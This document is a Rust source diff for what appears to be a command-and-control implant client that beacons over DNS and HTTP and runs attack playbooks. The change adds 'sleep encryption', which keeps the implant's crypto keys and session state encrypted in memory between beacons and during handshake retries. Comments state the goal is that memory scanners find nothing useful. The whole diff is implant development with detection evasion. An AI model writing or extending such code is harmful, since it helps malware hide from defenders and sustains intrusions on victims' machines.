@@ -6,6 +6,7 @@ use crate::agent::crypto::AgentCrypto;
 use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
 use crate::agent::ratchet::{MessageHeader, RatchetState};
 use crate::agent::transport::{csprng_u64, dns::DnsTransport, http::HttpTransport, TransportChain};
+use crate::modules::evasion::sleep_encrypt::SleepEncryptor;
 use crate::playbooks::{
   get_apt_playbook, get_playbook, Playbook, PlaybookContext, PlaybookExecutor,
 };
@@ -110,8 +111,13 @@ impl AgentClient {
             self.ratchet = None;
             self.session_id = Self::generate_session_id();
 
-            // Backoff before retry
-            std::thread::sleep(Duration::from_secs(30));
+            // Backoff before retry (encrypted — new keys still in memory)
+            let mut backoff_enc = SleepEncryptor::new();
+            unsafe {
+              backoff_enc.register(&mut self.handshake_crypto.private_key);
+              backoff_enc.register(&mut self.handshake_crypto.public_key);
+            }
+            backoff_enc.encrypted_sleep(Duration::from_secs(30));
 
             match self.perform_handshake_with_retry() {
               Ok(()) => {
@@ -205,7 +211,10 @@ impl AgentClient {
     Ok(())
   }
 
-  fn sleep_with_jitter(&self) {
+  /// Sleep between beacons with memory encryption.
+  /// During the entire sleep, crypto keys and session data are ciphertext in memory.
+  /// Memory scanners running during idle find nothing useful.
+  fn sleep_with_jitter(&mut self) {
     let base_secs = self.config.interval.as_secs_f32();
     let jitter_amount = base_secs * self.config.jitter;
     let rand_factor = if self.config.jitter > 0.0 {
@@ -215,9 +224,27 @@ impl AgentClient {
       0.0
     };
     let offset = (rand_factor * 2.0 - 1.0) * jitter_amount;
-
     let sleep_secs = (base_secs + offset).max(0.1);
-    std::thread::sleep(Duration::from_secs_f32(sleep_secs));
+    let duration = Duration::from_secs_f32(sleep_secs);
+
+    // Encrypt sensitive keys in memory during sleep.
+    // During the entire sleep duration, all crypto keys are ciphertext.
+    let mut encryptor = SleepEncryptor::new();
+
+    // Safety: self is not moved/dropped during encryptor lifetime (we own &mut self).
+    unsafe {
+      encryptor.register(&mut self.handshake_crypto.private_key);
+      encryptor.register(&mut self.handshake_crypto.public_key);
+      if let Some(ref mut key) = self.handshake_crypto.session_key {
+        encryptor.register(key);
+      }
+      if let Some(ref mut ratchet) = self.ratchet {
+        ratchet.register_for_sleep(&mut encryptor);
+      }
+    }
+
+    encryptor.encrypted_sleep(duration);
+    // All keys restored to plaintext — ready for next beacon.
   }
 
   fn generate_session_id() -> u64 {
